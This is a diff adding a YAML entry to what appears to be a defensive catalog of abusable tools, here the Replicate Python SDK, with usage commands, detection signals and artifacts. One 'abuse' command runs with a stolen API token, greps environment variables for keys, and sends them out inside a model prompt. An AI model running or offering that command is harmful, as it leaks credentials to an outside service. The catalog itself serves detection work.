@@ -1,0 +1,114 @@
+Name: Replicate Python SDK
+Id: replicate
+Category: cloud_mlops
+Vendor: Replicate
+OfficialUrl: https://replicate.com/docs
+Description: Official Replicate Python client library (`pip install replicate`). No
+  `replicate` console script is shipped — use `import replicate` / `replicate.run()`
+  from Python. For container CLI see separate cog entry.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - python
+  - python3
+  - python3.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities: []
+  Website: https://replicate.com/docs
+  CliExecutable: python3
+  Framework: python_library
+  HelperProcesses:
+  - python
+  - python3
+  Packages:
+    pip:
+    - replicate
+Commands:
+- Command: 'python3 -c "import replicate; print(replicate.run(''owner/model'', input={''prompt'':
+    ''hello''}))"'
+  Description: One-shot cloud model run via Python SDK (requires REPLICATE_API_TOKEN)
+  Category: Headless
+  Privileges: User
+  MitreID: T1102
+  Usage: normal
+  Platform: all
+- Command: 'REPLICATE_API_TOKEN="$STOLEN" python3 -c "import os,replicate; replicate.run(''owner/model'',
+    input={''prompt'': os.popen(''env | grep -iE key | head -10'').read()})"'
+  Description: Stolen Replicate token runs cloud model with env secrets in prompt
+    via Python SDK
+  Category: Headless
+  Privileges: User
+  MitreID: T1102
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: replicate-attribution
+  Name: replicate Python SDK attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.command_line
+    Value: replicate.run
+    Reliability: medium
+    Platform: all
+    Notes: Appears in python -c one-liners; corroborate with import replicate and
+      api.replicate.com network.
+  - Rank: 2
+    Field: process.name
+    Value: python3
+    Reliability: low
+    Platform: all
+    Notes: Generic — require replicate import/network corroboration.
+  FalsePositiveGuidance: Many legitimate Python workloads use python3. Match on REPLICATE_API_TOKEN
+    env + api.replicate.com egress when possible.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: replicate.com docs + PyPI replicate 1.0.7 (no console_scripts entry)
+  EmpiricalNotes: pip install replicate 1.0.7 produces no replicate binary in venv
+    bin/. Prior catalog assumed a replicate CLI with replicate run — incorrect. Primary
+    CLI or desktop binary empirically present on lab PATH or documented install footprint
+    (2026-07-19 revalidation).
+Artifacts:
+  Environment:
+  - Path: env REPLICATE_API_TOKEN
+    Notes: API token for Replicate HTTP API (also REPLICATE_API_KEY alias in some
+      docs)
+  Network:
+  - Domains:
+    - api.replicate.com
+    Description: Replicate HTTP API
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: none
+    UsableForAttribution: false
+Resources:
+- Link: https://replicate.com/docs
+  Title: Primary documentation
+- Link: https://pypi.org/project/replicate/
+  Title: PyPI replicate
+Uuid: d1f2c23e-9cce-5e1c-b80e-e5ad10ea8c31
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: false
+  Linux: false
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  Notes: PyPI package inspected in isolated venv; no CLI entrypoint.
